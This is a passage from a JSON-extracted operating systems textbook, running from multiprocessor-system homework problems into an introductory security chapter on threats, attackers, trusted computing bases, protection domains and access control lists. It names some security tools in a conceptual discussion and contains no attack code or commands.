Assume that normal caching is working so that fetching\r\nan instruction inside the loop consumes no bus cycles.\r\n14. Affinity scheduling reduces cache misses. Does it also reduce TLB misses? What\r\nabout page faults?\r\n15. For each of the topologies of Fig. 8-16, what is the diameter of the interconnection net\u0002work? Count all hops (host-router and router-router) equally for this problem.\r\n16. Consider the double-torus topology of Fig. 8-16(d) but expanded to size k × k. What\r\nis the diameter of the network? (Hint: Consider odd k and even k differently.)\r\n17. The bisection bandwidth of an interconnection network is often used as a measure of\r\nits capacity. It is computed by removing a minimal number of links that splits the net\u0002work into two equal-size units. The capacity of the removed links is then added up. If\r\nthere are many ways to make the split, the one with the minimum bandwidth is the\r\nbisection bandwidth. For an interconnection network consisting of an 8 × 8 × 8 cube,\r\nwhat is the bisection bandwidth if each link is 1 Gbps?\r\n18. Consider a multicomputer in which the network interface is in user mode, so only three\r\ncopies are needed from source RAM to destination RAM. Assume that moving a\r\n32-bit word to or from the network interface board takes 20 nsec and that the network\r\nitself operates at 1 Gbps. What would the delay be for a 64-byte packet being sent from\r\nsource to destination if we could ignore the copying time? What is it with the copying\r\ntime? Now consider the case where two extra copies are needed, to the kernel on the\r\nsending side and from the kernel on the receiving side. What is the delay in this case?\r\n19. Repeat the previous problem for both the three-copy case and the fiv e-copy case, but\r\nthis time compute the bandwidth rather than the delay.\r\n20. When transferring data from RAM to a network interface, pinning a page can be used,\r\nbut suppose that system calls to pin and unpin pages each take 1 μsec. Copying takes 5\r\nbytes/nsec using DMA but 20 nsec per byte using programmed I/O. How big does a\r\npacket have to be before pinning the page and using DMA is worth it?\nCHAP. 8 PROBLEMS 591\r\n21. When a procedure is scooped up from one machine and placed on another to be called\r\nby RPC, some problems can occur. In the text, we pointed out four of these: pointers,\r\nunknown array sizes, unknown parameter types, and global variables. An issue not\r\ndiscussed is what happens if the (remote) procedure executes a system call. What prob\u0002lems might that cause and what might be done to handle them?\r\n22. In a DSM system, when a page fault occurs, the needed page has to be located. List\r\ntwo possible ways to find the page.\r\n23. Consider the processor allocation of Fig. 8-24. Suppose that process H is moved from\r\nnode 2 to node 3. What is the total weight of the external traffic now?\r\n24. Some multicomputers allow running processes to be migrated from one node to anoth\u0002er. Is it sufficient to stop a process, freeze its memory image, and just ship that off to a\r\ndifferent node? Name two hard problems that have to be solved to make this work.\r\n25. Why is there a limit to cable length on an Ethernet network?\r\n26. In Fig. 8-27, the third and fourth layers are labeled Middleware and Application on all\r\nfour machines. In what sense are they all the same across platforms, and in what sense\r\nare they different?\r\n27. Figure 8-30 lists six different types of service. For each of the following applications,\r\nwhich service type is most appropriate?\r\n(a) Video on demand over the Internet.\r\n(b) Downloading a Web page.\r\n28. DNS names have a hierarchical structure, such as sales.general-widget.com. or\r\ncs.uni.edu One way to maintain the DNS database would be as one centralized data\u0002base, but that is not done because it would get too many requests/sec. Propose a way\r\nthat the DNS database could be maintained in practice.\r\n29. In the discussion of how URLs are processed by a browser, it was stated that con\u0002nections are made to port 80. Why?\r\n30. Migrating virtual machines may be easier than migrating processes, but migration can\r\nstill be difficult. What problems can arise when migrating a virtual machine?\r\n31. When a browser fetches a Web page, it first makes a TCP connection to get the text on\r\nthe page (in the HTML language). Then it closes the connection and examines the\r\npage. If there are figures or icons, it then makes a separate TCP connection to fetch\r\neach one. Suggest two alternative designs to improve performance here.\r\n32. When session semantics are used, it is always true that changes to a file are immediate\u0002ly visible to the process making the change and never visible to processes on other ma\u0002chines. However, it is an open question as to whether or not they should be immediate\u0002ly visible to other processes on the same machine. Give an argument each way.\r\n33. When multiple processes need access to data, in what way is object-based access better\r\nthan shared memory?\r\n34. When a Linda in operation is done to locate a tuple, searching the entire tuple space\r\nlinearly is very inefficient. Design a way to organize the tuple space that will speed up\r\nsearches on all in operations.\n592 MULTIPLE PROCESSOR SYSTEMS CHAP. 8\r\n35. Copying buffers takes time. Write a C program to find out how much time it takes on a\r\nsystem to which you have access. Use the clock or times functions to determine how\r\nlong it takes to copy a large array. Test with different array sizes to separate copying\r\ntime from overhead time.\r\n36. Write C functions that could be used as client and server stubs to make an RPC call to\r\nthe standard printf function, and a main program to test the functions. The client and\r\nserver should communicate by means of a data structure that could be transmitted over\r\na network. You may impose reasonable limits on the length of the format string and the\r\nnumber, types, and sizes of the variables your client stub will accept.\r\n37. Write a program that implements the sender-initiated and receiver-initiated load bal\u0002ancing algorithms described in Sec. 8.2. The algorithms should take as input a list of\r\nnewly created jobs specified as (creating processor, start time, required CPU time)\r\nwhere the creating processor is the number of the CPU that created the job, the\r\nstart time is the time at which the job was created, and the required CPU time is the\r\namount of CPU time the job needs to complete (specified in seconds). Assume a node\r\nis overloaded when it has one job and a second job is created. Assume a node is\r\nunderloaded when it has no jobs. Print the number of probe messages sent by both al\u0002gorithms under heavy and light workloads. Also print the maximum and minimum\r\nnumber of probes sent by any host and received by any host. To create the workloads,\r\nwrite two workload generators. The first should simulate a heavy workload, generat\u0002ing, on average, N jobs every AJL seconds, where AJL is the average job length and N\r\nis the number of processors. Job lengths can be a mix of long and short jobs, but the\r\nav erage job length must be AJL. The jobs should be randomly created (placed) across\r\nall processors. The second generator should simulate a light load, randomly generating\r\nN/3 jobs every AJL seconds. Play with other parameter settings for the workload gener\u0002ators and see how it affects the number of probe messages.\r\n38. One of the simplest ways to implement a publish/subscribe system is via a centralized\r\nbroker that receives published articles and distributes them to the appropriate sub\u0002scribers. Write a multithreaded application that emulates a broker-based pub/sub sys\u0002tem. Publisher and subscriber threads may communicate with the broker via (shared)\r\nmemory. Each message should start with a length field followed by that many charac\u0002ters. Publishers send messages to the broker where the first line of the message con\u0002tains a hierarchical subject line separated by dots followed by one or more lines that\r\ncomprise the published article. Subscribers send a message to the broker with a single\r\nline containing a hierarchical interest line separated by dots expressing the articles they\r\nare interested in. The interest line may contain the wildcard symbol ‘‘*’’. The broker\r\nmust respond by sending all (past) articles that match the subscriber’s interest. Articles\r\nin the message are separated by the line ‘‘BEGIN NEW ARTICLE.’’ The subscriber\r\nshould print each message it receives along with its subscriber identity (i.e., its interest\r\nline). The subscriber should continue to receive any new articles that are posted and\r\nmatch its interests. Publisher and subscriber threads can be created dynamically from\r\nthe terminal by typing ‘‘P’’ or ‘‘S’’ (for publisher or subscriber) followed by the hierar\u0002chical subject/interest line. Publishers will then prompt for the article. Typing a single\r\nline containing ‘‘.’’ will signal the end of the article. (This project can also be imple\u0002mented using processes communicating via TCP.)\n9\r\nSECURITY\r\nMany companies possess valuable information they want to guard closely.\r\nAmong many things, this information can be technical (e.g., a new chip design or\r\nsoftware), commercial (e.g., studies of the competition or marketing plans), finan\u0002cial (e.g., plans for a stock offering) or legal (e.g., documents about a potential\r\nmerger or takeover). Most of this information is stored on computers. Home com\u0002puters increasingly have valuable data on them, too. Many people keep their finan\u0002cial information, including tax returns and credit card numbers, on their computer.\r\nLove letters have gone digital. And hard disks these days are full of important\r\nphotos, videos, and movies.\r\nAs more and more of this information is stored in computer systems, the need\r\nto protect it is becoming increasingly important. Guarding the information against\r\nunauthorized usage is therefore a major concern of all operating systems. Unfor\u0002tunately, it is also becoming increasingly difficult due to the widespread accept\u0002ance of system bloat (and the accompanying bugs) as a normal phenomenon. In\r\nthis chapter we will examine computer security as it applies to operating systems.\r\nThe issues relating to operating system security have changed radically in the\r\npast few decades. Up until the early 1990s, few people had a computer at home\r\nand most computing was done at companies, universities, and other organizations\r\non multiuser computers ranging from large mainframes to minicomputers. Nearly\r\nall of these machines were isolated, not connected to any networks. As a conse\u0002quence security was almost entirely focused on how to keep the users out of each\r\n593"
      }
    }
  },
  "9 SECURITY": {
    "page": 624,
    "children": {
      "9.1 THE SECURITY ENVIRONMENT": {
        "page": 626,
        "children": {
          "9.1.1 Threats": {
            "page": 627,
            "content": "9.1.1 Threats\r\nMany security texts decompose the security of an information system in three\r\ncomponents: confidentiality, integrity, and availability. Together, they are often\r\nreferred to as ‘‘CIA.’’ They are shown in Fig. 9-1 and constitute the core security\r\nproperties that we must protect against attackers and eavesdroppers—such as the\r\n(other) CIA.\r\nThe first, confidentiality, is concerned with having secret data remain secret.\r\nMore specifically, if the owner of some data has decided that these data are to be\r\nmade available only to certain people and no others, the system should guarantee\r\nthat release of the data to unauthorized people never occurs. As an absolute mini\u0002mum, the owner should be able to specify who can see what, and the system\r\nshould enforce these specifications, which ideally should be per file.\r\nGoal Threat\r\nConfidentiality Exposure of data\r\nIntegrity Tamper ing with data\r\nAv ailability Denial of service\r\nFigure 9-1. Security goals and threats.\r\nThe second property, integrity, means that unauthorized users should not be\r\nable to modify any data without the owner’s permission. Data modification in this\r\ncontext includes not only changing the data, but also removing data and adding\r\nfalse data. If a system cannot guarantee that data deposited in it remain unchanged\r\nuntil the owner decides to change them, it is not worth much for data storage.\r\nThe third property, av ailability, means that nobody can disturb the system to\r\nmake it unusable. Such denial-of-service attacks are increasingly common. For ex\u0002ample, if a computer is an Internet server, sending a flood of requests to it may\r\ncripple it by eating up all of its CPU time just examining and discarding incoming\r\nrequests. If it takes, say, 100 μsec to process an incoming request to read a Web\r\npage, then anyone who manages to send 10,000 requests/sec can wipe it out. Rea\u0002sonable models and technology for dealing with attacks on confidentiality and in\u0002tegrity are available; foiling denial-of-service attacks is much harder.\r\nLater on, people decided that three fundamental properties were not enough for\r\nall possible scenarios, and so they added additional ones, such as authenticity,\r\naccountability, nonrepudiability, privacy, and others. Clearly, these are all nice to\nSEC. 9.1 THE SECURITY ENVIRONMENT 597\r\nhave. Even so, the original three still have a special place in the hearts and minds\r\nof most (elderly) security experts.\r\nSystems are under constant threat from attackers. For instance, an attacker may\r\nsniff the traffic on a local area network and break the confidentiality of the infor\u0002mation, especially if the communication protocol does not use encryption. Like\u0002wise, an intruder may attack a database system and remove or modify some of the\r\nrecords, breaking their integrity. Finally, a judiciously placed denial-of-service at\u0002tack may destroy the availability of one or more computer systems.\r\nThere are many ways in which an outsider can attack a system; we will look at\r\nsome of them later in this chapter. Many of the attacks nowadays are supported by\r\nhighly advanced tools and services. Some of these tools are built by so-called\r\n‘‘black-hat’’ hackers, others by ‘‘white hats.’’ Just like in the old Western movies,\r\nthe bad guys in the digital world wear black hats and ride Trojan horses—the good\r\nhackers wear white hats and code faster than their shadows.\r\nIncidentally, the popular press tends to use the generic term ‘‘hacker’’ exclu\u0002sively for the black hats. However, within the computer world, ‘‘hacker’’ is a term\r\nof honor reserved for great programmers. While some of these are rogues, most are\r\nnot. The press got this one wrong. In deference to true hackers, we will use the\r\nterm in the original sense and will call people who try to break into computer sys\u0002tems where they do not belong either crackers or black hats.\r\nGoing back to the attack tools, it may come as a surprise that many of them are\r\ndeveloped by white hats. The explanation is that, while the baddies may (and do)\r\nuse them also, these tools primarily serve as convenient means to test the security\r\nof a computer system or network. For instance, a tool like nmap helps attackers de\u0002termine the network services offered by a computer system by means of a port\u0002scan. One of the simplest scanning techniques offered by nmap is to try and set up\r\nTCP connections to every possible port number on a computer system. If the con\u0002nection setup to a port succeeds, there must be a server listening on that port.\r\nMoreover, since many services use well-known port numbers, it allows the security\r\ntester (or attacker) to find out in detail what services are running on a machine.\r\nPhrased differently, nmap is useful for attackers as well as defenders, a property\r\nthat is known as dual use. Another set of tools, collectively referred to as dsniff,\r\noffers a variety of ways to monitor network traffic and redirect network packets.\r\nThe Low Orbit Ion Cannon (LOIC), meanwhile, is not (just) a SciFi weapon to\r\nvaporize enemies in a galaxy far away, but also a tool to launch denial-of-service\r\nattacks. And with the Metasploit framework that comes preloaded with hundreds\r\nof convenient exploits against all sorts of targets, launching attacks was never easi\u0002er. Clearly, all these tools have dual-use issues. Like knives and axes, it does not\r\nmean they are bad per se.\r\nHowever, cybercriminals also offer a wide range of (often online) services to\r\nwannabe cyber kingpins: to spread malware, launder money, redirect traffic, pro\u0002vide hosting with a no-questions-asked policy, and many other useful things. Most\r\ncriminal activities on the Internet build on infrastructures known as botnets that\n598 SECURITY CHAP. 9\r\nconsist of thousands (and sometimes millions) of compromised computers—often\r\nnormal computers of innocent and ignorant users. There are all-too-many ways in\r\nwhich attackers can compromise a user’s machine. For instance, they may offer\r\nfree, but malicious versions of popular software. The sad truth is that the promise\r\nof free (‘‘cracked’’) versions of expensive software is irresistible to many users.\r\nUnfortunately, the installation of such programs gives the attacker full access to the\r\nmachine. It is like handing over the key to your house to a perfect stranger. When\r\nthe computer is under control of the attacker, it is known as a bot or zombie. Typi\u0002cally, none of this is visible to the user. Now adays, botnets consisting of hundreds\r\nof thousands of zombies are the workhorses of many criminal activities. A few\r\nhundred thousand PCs are a lot of machines to pilfer for banking details, or to use\r\nfor spam, and just think of the carnage that may ensue when a million zombies aim\r\ntheir LOIC weapons at an unsuspecting target.\r\nSometimes, the effects of the attack go well beyond the computer systems\r\nthemselves and reach directly into the physical world. One example is the attack on\r\nthe waste management system of Maroochy Shire, in Queensland, Australia—not\r\ntoo far from Brisbane. A disgruntled ex-employee of a sewage system installation\r\ncompany was not amused when the Maroochy Shire Council turned down his job\r\napplication and he decided not to get mad, but to get even. He took control of the\r\nsewage system and caused a million liters of raw sew age to spill into the parks,\r\nrivers and coastal waters (where fish promptly died)—as well as other places.\r\nMore generally, there are folks out there who bear a grudge against some par\u0002ticular country or (ethnic) group or who are just angry at the world in general and\r\nwant to destroy as much infrastructure as they can without too much regard to the\r\nnature of the damage or who the specific victims are. Usually such people feel that\r\nattacking their enemies’ computers is a good thing, but the attacks themselves may\r\nnot be well targeted.\r\nAt the opposite extreme is cyberwarfare. A cyberweapon commonly referred\r\nto as Stuxnet physically damaged the centrifuges in a uranium enrichment facility\r\nin Natanz, Iran, and is said to have caused a significant slowdown in Iran’s nuclear\r\nprogram. While no one has come forward to claim credit for this attack, something\r\nthat sophisticated probably originated with the secret services of one or more coun\u0002tries hostile to Iran.\r\nOne important aspect of the security problem, related to confidentiality, is pri\u0002vacy: protecting individuals from misuse of information about them. This quickly\r\ngets into many leg al and moral issues. Should the government compile dossiers on\r\nev eryone in order to catch X-cheaters, where X is ‘‘welfare’’ or ‘‘tax,’’ depending\r\non your politics? Should the police be able to look up anything on anyone in order\r\nto stop organized crime? What about the U.S. National Security Agency’s moni\u0002toring millions of cell phones daily in the hope of catching would-be terrorists?\r\nDo employers and insurance companies have rights? What happens when these\r\nrights conflict with individual rights? All of these issues are extremely important\r\nbut are beyond the scope of this book.\nSEC. 9.1 THE SECURITY ENVIRONMENT 599"
          },
          "9.1.2 Attackers": {
            "page": 630,
            "content": "9.1.2 Attackers\r\nMost people are pretty nice and obey the law, so why worry about security?\r\nBecause there are unfortunately a few people around who are not so nice and want\r\nto cause trouble (possibly for their own commercial gain). In the security litera\u0002ture, people who are nosing around places where they hav e no business being are\r\ncalled attackers, intruders, or sometimes adversaries. A few decades ago, crack\u0002ing computer systems was all about showing your friends how clever you were, but\r\nnowadays this is no longer the only or even the most important reason to break into\r\na system. There are many different types of attacker with different kinds of moti\u0002vation: theft, hacktivism, vandalism, terrorism, cyberwarfare, espionage, spam, ex\u0002tortion, fraud—and occasionally the attacker still simply wants to show off, or\r\nexpose the poor security of an organization.\r\nAttackers similarly range from not very skilled wannabe black hats, also\r\nreferred to as script-kiddies, to extremely skillful crackers. They may be profes\u0002sionals working for criminals, governments (e.g., the police, the military, or the\r\nsecret services), or security firms—or hobbyists that do all their hacking in their\r\nspare time. It should be clear that trying to keep a hostile foreign government from\r\nstealing military secrets is quite a different matter from trying to keep students\r\nfrom inserting a funny message-of-the-day into the system. The amount of effort\r\nneeded for security and protection clearly depends on who the enemy is thought to\r\nbe."
          }
        }
      },
      "9.2 OPERATING SYSTEMS SECURITY": {
        "page": 630,
        "children": {
          "9.2.1 Can We Build Secure Systems?": {
            "page": 631,
            "content": "9.2.1 Can We Build Secure Systems?\r\nNowadays, it is hard to open a newspaper without reading yet another story\r\nabout attackers breaking into computer systems, stealing information, or con\u0002trolling millions of computers. A naive person might logically ask two questions\r\nconcerning this state of affairs:\r\n1. Is it possible to build a secure computer system?\r\n2. If so, why is it not done?\r\nThe answer to the first one is: ‘‘In theory, yes.’’ In principle, software can be free\r\nof bugs and we can even verify that it is secure—as long as that software is not too\r\nlarge or complicated. Unfortunately, computer systems today are horrendously\r\ncomplicated and this has a lot to do with the second question. The second question,\r\nwhy secure systems are not being built, comes down to two fundamental reasons.\r\nFirst, current systems are not secure but users are unwilling to throw them out. If\r\nMicrosoft were to announce that in addition to Windows it had a new product,\r\nSecureOS, that was resistant to viruses but did not run Windows applications, it is\r\nfar from certain that every person and company would drop Windows like a hot\r\npotato and buy the new system immediately. In fact, Microsoft has a secure OS\r\n(Fandrich et al., 2006) but is not marketing it.\r\nThe second issue is more subtle. The only known way to build a secure system\r\nis to keep it simple. Features are the enemy of security. The good folks in the\r\nMarketing Dept. at most tech companies believe (rightly or wrongly) that what\r\nusers want is more features, bigger features, and better features. They make sure\r\nthat the system architects designing their products get the word. However, all these\r\nmean more complexity, more code, more bugs, and more security errors.\nSEC. 9.2 OPERATING SYSTEMS SECURITY 601\r\nHere are two fairly simple examples. The first email systems sent messages as\r\nASCII text. They were simple and could be made fairly secure. Unless there are\r\nreally dumb bugs in the email program, there is little an incoming ASCII message\r\ncan do to damage a computer system (we will actually see some attacks that may\r\nbe possible later in this chapter). Then people got the idea to expand email to in\u0002clude other types of documents, for example, Word files, which can contain pro\u0002grams in macros. Reading such a document means running somebody else’s pro\u0002gram on your computer. No matter how much sandboxing is used, running a for\u0002eign program on your computer is inherently more dangerous than looking at\r\nASCII text. Did users demand the ability to change email from passive documents\r\nto active programs? Probably not, but somebody thought it would be a nifty idea,\r\nwithout worrying too much about the security implications.\r\nThe second example is the same thing for Web pages. When the Web consisted\r\nof passive HTML pages, it did not pose a major security problem. Now that many\r\nWeb pages contain programs (applets and JavaScript) that the user has to run to\r\nview the content, one security leak after another pops up. As soon as one is fixed,\r\nanother takes its place. When the Web was entirely static, were users up in arms\r\ndemanding dynamic content? Not that the authors remember, but its introduction\r\nbrought with it a raft of security problems. It looks like the Vice-President-In\u0002Charge-Of-Saying-No was asleep at the wheel.\r\nActually, there are some organizations that think good security is more impor\u0002tant than nifty new features, the military being the prime example. In the following\r\nsections we will look some of the issues involved, but they can be summarized in\r\none sentence. To build a secure system, have a security model at the core of the\r\noperating system that is simple enough that the designers can actually understand\r\nit, and resist all pressure to deviate from it in order to add new features."
          },
          "9.2.2 Trusted Computing Base": {
            "page": 632,
            "content": "9.2.2 Trusted Computing Base\r\nIn the security world, people often talk about trusted systems rather than\r\nsecure systems. These are systems that have formally stated security requirements\r\nand meet these requirements. At the heart of every trusted system is a minimal\r\nTCB (Trusted Computing Base) consisting of the hardware and software neces\u0002sary for enforcing all the security rules. If the trusted computing base is working to\r\nspecification, the system security cannot be compromised, no matter what else is\r\nwrong.\r\nThe TCB typically consists of most of the hardware (except I/O devices that do\r\nnot affect security), a portion of the operating system kernel, and most or all of the\r\nuser programs that have superuser power (e.g., SETUID root programs in UNIX).\r\nOperating system functions that must be part of the TCB include process creation,\r\nprocess switching, memory management, and part of file and I/O management. In\r\na secure design, often the TCB will be quite separate from the rest of the operating\r\nsystem in order to minimize its size and verify its correctness.\n602 SECURITY CHAP. 9\r\nAn important part of the TCB is the reference monitor, as shown in Fig. 9-2.\r\nThe reference monitor accepts all system calls involving security, such as opening\r\nfiles, and decides whether they should be processed or not. The reference monitor\r\nthus allows all the security decisions to be put in one place, with no possibility of\r\nbypassing it. Most operating systems are not designed this way, which is part of the\r\nreason they are so insecure.\r\nUser process\r\nAll system calls go through the\r\n reference monitor for security checking\r\nReference monitor\r\nTrusted computing base\r\nOperating system kernel\r\nUser\r\nspace\r\nKernel\r\nspace\r\nFigure 9-2. A reference monitor.\r\nOne of the goals of some current security research is to reduce the trusted com\u0002puting base from millions of lines of code to merely tens of thousands of lines of\r\ncode. In Fig. 1-26 we saw the structure of the MINIX 3 operating system, which is\r\na POSIX-conformant system but with a radically different structure than Linux or\r\nFreeBSD. With MINIX 3, only about 10.000 lines of code run in the kernel. Every\u0002thing else runs as a set of user processes. Some of these, like the file system and\r\nthe process manager, are part of the trusted computing base since they can easily\r\ncompromise system security. But other parts, such as the printer driver and the\r\naudio driver, are not part of the trusted computing base and no matter what is\r\nwrong with them (even if they are taken over by a virus), there is nothing they can\r\ndo to compromise system security. By reducing the trusted computing base by two\r\norders of magnitude, systems like MINIX 3 can potentially offer much higher secu\u0002rity than conventional designs."
          }
        }
      },
      "9.3 CONTROLLING ACCESS TO RESOURCES": {
        "page": 633,
        "children": {
          "9.3.1 Protection Domains": {
            "page": 634,
            "content": "9.3.1 Protection Domains\r\nA computer system contains many resources, or ‘‘objects,’’ that need to be pro\u0002tected. These objects can be hardware (e.g., CPUs, memory pages, disk drives, or\r\nprinters) or software (e.g., processes, files, databases, or semaphores).\r\nEach object has a unique name by which it is referenced, and a finite set of op\u0002erations that processes are allowed to carry out on it. The read and wr ite operations\r\nare appropriate to a file; up and down make sense on a semaphore.\r\nIt is obvious that a way is needed to prohibit processes from accessing objects\r\nthat they are not authorized to access. Furthermore, this mechanism must also\r\nmake it possible to restrict processes to a subset of the legal operations when that is\r\nneeded. For example, process A may be entitled to read, but not write, file F.\r\nIn order to discuss different protection mechanisms, it is useful to introduce the\r\nconcept of a domain. A domain is a set of (object, rights) pairs. Each pair speci\u0002fies an object and some subset of the operations that can be performed on it. A\r\nright in this context means permission to perform one of the operations. Often a\r\ndomain corresponds to a single user, telling what the user can do and not do, but a\r\ndomain can also be more general than just one user. For example, the members of a\r\nprogramming team working on some project might all belong to the same domain\r\nso that they can all access the project files.\r\nHow objects are allocated to domains depends on the specifics of who needs to\r\nknow what. One basic concept, however, is the POLA (Principle of Least Auth\u0002ority) or need to know. In general, security works best when each domain has the\r\nminimum objects and privileges to do its work—and no more.\r\nFigure 9-3 shows three domains, showing the objects in each domain and the\r\nrights (Read, Write, eXecute) available on each object. Note that Printer1 is in two\r\ndomains at the same time, with the same rights in each. File1 is also in two do\u0002mains, with different rights in each one.\r\nDomain 1 Domain 2 Domain 3\r\nFile1[R]\r\nFile2[RW]\r\nFile1[RW]\r\nFile4[RWX]\r\nFile5[RW]\r\nPrinter1[W]\r\nFile6[RWX]\r\nPlotter2[W]\r\nFigure 9-3. Three protection domains.\r\nAt every instant of time, each process runs in some protection domain. In\r\nother words, there is some collection of objects it can access, and for each object it\r\nhas some set of rights. Processes can also switch from domain to domain during\r\nexecution. The rules for domain switching are highly system dependent.\n604 SECURITY CHAP. 9\r\nTo make the idea of a protection domain more concrete, let us look at UNIX\r\n(including Linux, FreeBSD, and friends). In UNIX, the domain of a process is de\u0002fined by its UID and GID. When a user logs in, his shell gets the UID and GID\r\ncontained in his entry in the password file and these are inherited by all its chil\u0002dren. Given any (UID, GID) combination, it is possible to make a complete list of\r\nall objects (files, including I/O devices represented by special files, etc.) that can be\r\naccessed, and whether they can be accessed for reading, writing, or executing. Two\r\nprocesses with the same (UID, GID) combination will have access to exactly the\r\nsame set of objects. Processes with different (UID, GID) values will have access to\r\na different set of files, although there may be considerable overlap.\r\nFurthermore, each process in UNIX has two halves: the user part and the ker\u0002nel part. When the process does a system call, it switches from the user part to the\r\nkernel part. The kernel part has access to a different set of objects from the user\r\npart. For example, the kernel can access all the pages in physical memory, the en\u0002tire disk, and all the other protected resources. Thus, a system call causes a domain\r\nswitch.\r\nWhen a process does an exec on a file with the SETUID or SETGID bit on, it\r\nacquires a new effective UID or GID. With a different (UID, GID) combination, it\r\nhas a different set of files and operations available. Running a program with\r\nSETUID or SETGID is also a domain switch, since the rights available change.\r\nAn important question is how the system keeps track of which object belongs\r\nto which domain. Conceptually, at least, one can envision a large matrix, with the\r\nrows being domains and the columns being objects. Each box lists the rights, if\r\nany, that the domain contains for the object. The matrix for Fig. 9-3 is shown in\r\nFig. 9-4. Given this matrix and the current domain number, the system can tell if\r\nan access to a given object in a particular way from a specified domain is allowed.\r\nPrinter1 Plotter2\r\nDomain\r\n1\r\n2\r\n3\r\nFile1 File2 File3 File4 File5 File6\r\nObject\r\nRead\r\nRead\r\nRead\r\nWrite\r\nRead\r\nWrite\r\nRead\r\nWrite\r\nExecute\r\nRead\r\nWrite\r\nExecute\r\nWrite\r\nWrite Write\r\nFigure 9-4. A protection matrix.\r\nDomain switching itself can be easily included in the matrix model by realiz\u0002ing that a domain is itself an object, with the operation enter. Figure 9-5 shows the\r\nmatrix of Fig. 9-4 again, only now with the three domains as objects themselves.\r\nProcesses in domain 1 can switch to domain 2, but once there, they cannot go back.\nSEC. 9.3 CONTROLLING ACCESS TO RESOURCES 605\r\nThis situation models executing a SETUID program in UNIX. No other domain\r\nswitches are permitted in this example.\r\nObject\r\nDomain1 Domain2 Domain3\r\nEnter\r\nPrinter1 Plotter2\r\nDomain\r\n1\r\n2\r\n3\r\nFile1 File2 File3 File4 File5 File6\r\nRead\r\nRead\r\nRead\r\nWrite\r\nRead\r\nWrite\r\nRead\r\nWrite\r\nExecute\r\nRead\r\nWrite\r\nExecute\r\nWrite\r\nWrite Write\r\nFigure 9-5. A protection matrix with domains as objects."
          },
          "9.3.2 Access Control Lists": {
            "page": 636,
            "content": "9.3.2 Access Control Lists\r\nIn practice, actually storing the matrix of Fig. 9-5 is rarely done because it is\r\nlarge and sparse. Most domains have no access at all to most objects, so storing a\r\nvery large, mostly empty, matrix is a waste of disk space. Two methods that are\r\npractical, however, are storing the matrix by rows or by columns, and then storing\r\nonly the nonempty elements. The two approaches are surprisingly different. In this\r\nsection we will look at storing it by column; in the next we will study storing it by\r\nrow.\r\nThe first technique consists of associating with each object an (ordered) list\r\ncontaining all the domains that may access the object, and how. This list is called\r\nthe ACL (Access Control List) and is illustrated in Fig. 9-6. Here we see three\r\nprocesses, each belonging to a different domain, A, B, and C, and three files F1,\r\nF2, and F3. For simplicity, we will assume that each domain corresponds to exact\u0002ly one user, in this case, users A, B, and C. Often in the security literature the users\r\nare called subjects or principals, to contrast them with the things owned, the\r\nobjects, such as files.\r\nEach file has an ACL associated with it. File F1 has two entries in its ACL\r\n(separated by a semicolon). The first entry says that any process owned by user A\r\nmay read and write the file. The second entry says that any process owned by user\r\nB may read the file. All other accesses by these users and all accesses by other\r\nusers are forbidden. Note that the rights are granted by user, not by process. As\r\nfar as the protection system goes, any process owned by user A can read and write\r\nfile F1. It does not matter if there is one such process or 100 of them. It is the\r\nowner, not the process ID, that matters.\r\nFile F2 has three entries in its ACL: A, B, and C can all read the file, and B can\r\nalso write it. No other accesses are allowed. File F3 is apparently an executable\r\nprogram, since B and C can both read and execute it. B can also write it.\n606 SECURITY CHAP. 9\r\nA B C\r\nProcess\r\nOwner\r\nF1 A: RW; B: R\r\nF2 A: R; B:RW; C:R\r\nF3 B:RWX; C: RX\r\nFile\r\nUser\r\nspace\r\nKernel\r\nspace\r\nACL\r\nFigure 9-6. Use of access control lists to manage file access.\r\nThis example illustrates the most basic form of protection with ACLs. More\r\nsophisticated systems are often used in practice. To start with, we have shown only\r\nthree rights so far: read, write, and execute. There may be additional rights as well.\r\nSome of these may be generic, that is, apply to all objects, and some may be object\r\nspecific. Examples of generic rights are destroy object and copy object. These\r\ncould hold for any object, no matter what type it is. Object-specific rights might in\u0002clude append message for a mailbox object and sor t alphabetically for a directory\r\nobject.\r\nSo far, our ACL entries have been for individual users. Many systems support\r\nthe concept of a group of users. Groups have names and can be included in ACLs.\r\nTw o variations on the semantics of groups are possible. In some systems, each\r\nprocess has a user ID (UID) and group ID (GID). In such systems, an ACL entry\r\ncontains entries of the form\r\nUID1, GID1: rights1; UID2, GID2: rights2; ...\r\nUnder these conditions, when a request is made to access an object, a check is\r\nmade using the caller’s UID and GID. If they are present in the ACL, the rights\r\nlisted are available. If the (UID, GID) combination is not in the list, the access is\r\nnot permitted.\r\nUsing groups this way effectively introduces the concept of a role. Consider a\r\ncomputer installation in which Tana is system administrator, and thus in the group\r\nsysadm. Howev er, suppose that the company also has some clubs for employees\r\nand Tana is a member of the pigeon fanciers club. Club members belong to the\r\ngroup pigfan and have access to the company’s computers for managing their\r\npigeon database. A portion of the ACL might be as shown in Fig. 9-7.\r\nIf Tana tries to access one of these files, the result depends on which group she\r\nis currently logged in as. When she logs in, the system may ask her to choose\r\nwhich of her groups she is currently using, or there might even be different login\nSEC. 9.3 CONTROLLING ACCESS TO RESOURCES 607\r\nFile Access control list\r\nPassword tana, sysadm: RW\r\nPigeon data bill, pigfan: RW; tana, pigfan: RW; ...\r\nFigure 9-7. Tw o access control lists.\r\nnames and/or passwords to keep them separate. The point of this scheme is to pre\u0002vent Tana from accessing the password file when she currently has her pigeon\r\nfancier’s hat on. She can do that only when logged in as the system administrator.\r\nIn some cases, a user may have access to certain files independent of which\r\ngroup she is currently logged in as. That case can be handled by introducing the\r\nconcept of a wildcard, which means everyone. For example, the entry\r\ntana, *: RW\r\nfor the password file would give Tana access no matter which group she was cur\u0002rently in as.\r\nYet another possibility is that if a user belongs to any of the groups that have\r\ncertain access rights, the access is permitted. The advantage here is that a user be\u0002longing to multiple groups does not have to specify which group to use at login\r\ntime. All of them count all of the time. A disadvantage of this approach is that it\r\nprovides less encapsulation: Tana can edit the password file during a pigeon club\r\nmeeting.\r\nThe use of groups and wildcards introduces the possibility of selectively block\u0002ing a specific user from accessing a file. For example, the entry\r\nvirgil, *: (none); *, *: RW\r\ngives the entire world except for Virgil read and write access to the file. This works\r\nbecause the entries are scanned in order, and the first one that applies is taken; sub\u0002sequent entries are not even examined. A match is found for Virgil on the first\r\nentry and the access rights, in this case, ‘‘none’’ are found and applied. The search\r\nis terminated at that point. The fact that the rest of the world has access is never\r\nev en seen.\r\nThe other way of dealing with groups is not to have ACL entries consist of\r\n(UID, GID) pairs, but to have each entry be a UID or a GID. For example, an\r\nentry for the file pigeon data could be\r\ndebbie: RW; phil: RW; 